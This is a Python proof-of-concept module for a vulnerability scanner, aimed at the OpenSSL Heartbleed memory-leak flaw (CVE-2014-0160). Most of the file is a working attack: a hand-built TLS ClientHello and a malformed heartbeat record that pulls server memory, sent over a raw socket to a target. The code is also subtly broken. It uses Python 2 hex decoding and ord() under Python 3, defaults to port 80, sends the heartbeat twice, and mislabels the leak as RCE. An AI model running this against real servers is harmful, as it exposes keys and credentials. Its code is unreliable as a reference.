# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import struct
import socket
import time
import select
import urllib.request
import urllib.parse
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'OpenSSL_0001'  # 平台漏洞编号，留空
    name = 'OpenSSL TLS和DTLS扩展包处理外界读内存泄露漏洞(CNVD-2014-02175)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-04-07'  # 漏洞公布时间
    desc = '''
        OpenSSL是一款开放源码的SSL实现，用来实现网络通信的高强度加密。
        OpenSSL TLS和DTLS扩展包处理存在外界读内存泄露漏洞。
        由于程序未能正确处理Heartbeart扩展包，允许远程攻击者可以通过制作的数据包，读取服务器内存中的敏感信息(如用户名、密码、Cookie、私钥等)。
        仅OpenSSL的1.0.1及1.0.2-beta版本受到影响，包括：1.0.1f及1.0.2-beta1版本。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-02175'  # 漏洞来源
    cnvd_id = 'CNVD-2014-02175'  # cnvd漏洞编号
    cve_id = 'CVE-2014-0160'  # cve编号
    product = 'OpenSSL'  # 漏洞应用名称
    product_version = 'OpenSSL 1.0.1f3'  # 漏洞应用版本


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')


def h2bin2(x):
    return bytes.fromhex(x.replace(' ', '').replace('\n', ''))


hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')


def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay


def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            return False

        if typ == 24:
            return True

        if typ == 21:
            return False


class Poc(ABPoc):
    poc_id = 'c033ce12-7058-42b0-9b86-7dcc365418f7'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://github.com/Medicean/VulApps/tree/master/o/openssl/heartbleed_CVE-2014-0160
            # 取出地址和端口
            target_parse = urllib.parse.urlparse(self.target)
            host = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 80

            portint = int(port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, portint))
            s.send(hello)
            while True:
                typ, ver, pay = recvmsg(s)
                print(typ, ver, pay)
                if typ is None:
                    return
                # Look for server hello done message.
                if typ == 22 and ord(pay[0]) == 0x0E:
                    break
            s.send(hb)
            if hit_hb(s):
                # print "Heartbleed OpenSSL: %s : %s" % (host, str(port))
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            else:
                print("Not Vulnerable.")
            s.close()

        except Exception as e:
            self.output.info('执行异常{}'.format(e))
            raise

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
